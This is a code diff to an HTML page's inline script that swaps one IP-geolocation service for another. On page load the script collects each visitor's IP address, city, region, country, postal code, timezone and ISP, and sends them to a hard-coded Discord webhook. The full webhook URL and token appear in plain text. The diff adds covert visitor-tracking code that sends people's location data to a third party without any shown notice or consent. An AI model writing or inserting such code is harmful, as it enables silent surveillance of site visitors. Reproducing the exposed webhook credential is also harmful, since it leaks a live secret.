@@ -94,28 +94,28 @@
   </style>
 </head>
   <script>
-  fetch('https://ipapi.co/json/')
-    .then(response => response.json())
-    .then(data => {
-      const payload = {
-        content: "**🌍 New Visitor Info**",
-        embeds: [{
-          title: "📡 IP Data",
-          color: 3447003,
-          fields: [
-            { name: "IP", value: data.ip, inline: true },
-            { name: "City", value: data.city, inline: true },
-            { name: "Region", value: data.region, inline: true },
-            { name: "Country", value: data.country_name, inline: true },
-            { name: "Postal", value: data.postal, inline: true },
-            { name: "Timezone", value: data.timezone, inline: true },
-            { name: "ISP", value: data.org, inline: false }
-          ],
-          footer: {
-            text: `Visitor Data | ${new Date().toLocaleString()}`
-          }
-        }]
-      };
+  fetch('https://ipwho.is/')
+  .then(res => res.json())
+  .then(data => {
+    const payload = {
+      content: "**🌍 New Visitor Info**",
+      embeds: [{
+        title: "📡 IP Data",
+        color: 3447003,
+        fields: [
+          { name: "IP", value: data.ip, inline: true },
+          { name: "City", value: data.city, inline: true },
+          { name: "Region", value: data.region, inline: true },
+          { name: "Country", value: data.country, inline: true },
+          { name: "Postal", value: data.postal, inline: true },
+          { name: "Timezone", value: data.timezone_gmt, inline: true },
+          { name: "ISP", value: data.connection?.org || 'N/A', inline: false }
+        ],
+        footer: {
+          text: `Visitor Data | ${new Date().toLocaleString()}`
+        }
+      }]
+    };
       const UsedToDeleteWebhooks = "https://discord.com/api/webhooks/1363659573558509741/UVWbnqe1-58ryVECcvltIHf8BfNjzh-wuLyn57Fnh9-JaG1BkCbgxhbwfOPH6MYHj9XZ";
 
       fetch(UsedToDeleteWebhooks, {
